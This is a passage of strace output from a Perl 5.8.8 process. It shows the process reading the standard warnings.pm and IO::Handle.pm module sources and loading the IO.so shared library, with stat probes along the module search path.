\'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
6823  07:15:42.814193 brk(0x81b6000)    = 0x81b6000
6823  07:15:42.814210 brk(0x81b5000)    = 0x81b5000
6823  07:15:42.814287 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
6823  07:15:42.814752 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
6823  07:15:42.815532 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
6823  07:15:42.815661 read(8, "", 4096) = 0
6823  07:15:42.815674 close(8)          = 0
6823  07:15:42.815823 _llseek(6, 412, [412], SEEK_SET) = 0
6823  07:15:42.815851 _llseek(6, 0, [412], SEEK_CUR) = 0
6823  07:15:42.815889 close(6)          = 0
6823  07:15:42.815953 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
6823  07:15:42.815977 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
6823  07:15:42.816004 futex(0xb7fa6070, 0x81 /* FUTEX_??? */, 2147483647) = 0
6823  07:15:42.816019 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
6823  07:15:42.816033 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
6823  07:15:42.816120 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
6823  07:15:42.816145 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7faa000
6823  07:15:42.816158 mmap2(0xb7fae000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7fae000
6823  07:15:42.816172 close(6)          = 0
6823  07:15:42.816296 stat64("/etc/perl/IO/Handle.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.816315 stat64("/etc/perl/IO/Handle.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.816341 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.816385 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.816401 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.816447 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.816461 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.816473 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.816486 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.816498 stat64("/usr/share/perl5/IO/Handle.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.816511 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.816524 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
6823  07:15:42.816545 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
6823  07:15:42.816559 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80ca78) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.816570 _llseek(6, 0, [0], SEEK_CUR) = 0
6823  07:15:42.816587 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
6823  07:15:42.816978 stat64("/etc/perl/Symbol.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.816995 stat64("/etc/perl/Symbol.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.817008 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
